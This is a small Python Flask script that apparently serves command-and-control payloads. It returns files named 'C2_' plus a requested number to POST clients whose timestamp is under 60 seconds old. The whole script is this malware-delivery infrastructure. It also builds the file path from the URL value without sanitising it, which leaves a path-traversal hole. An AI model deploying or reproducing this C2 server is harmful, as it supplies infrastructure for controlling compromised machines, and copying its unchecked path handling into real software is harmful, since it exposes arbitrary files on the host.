from flask import Flask
from flask import send_file
from flask import request
from datetime import datetime

app = Flask(__name__)

@app.route("/<number>", methods = ['POST'])
def handle_n_serve(number):
    if request.method == 'POST':
        content = request.get_json()
        date_time = content["timestamp"]
        date_time_req = datetime.strptime(date_time, '%d/%m/%y %H:%M:%S')
        now = datetime.now()
        if (now - date_time_req).total_seconds() <= 60: #to avoid replay attack
            return send_file("./C2_" + number, as_attachment=True)

if __name__ == "__main__":
    app.run(host='0.0.0.0')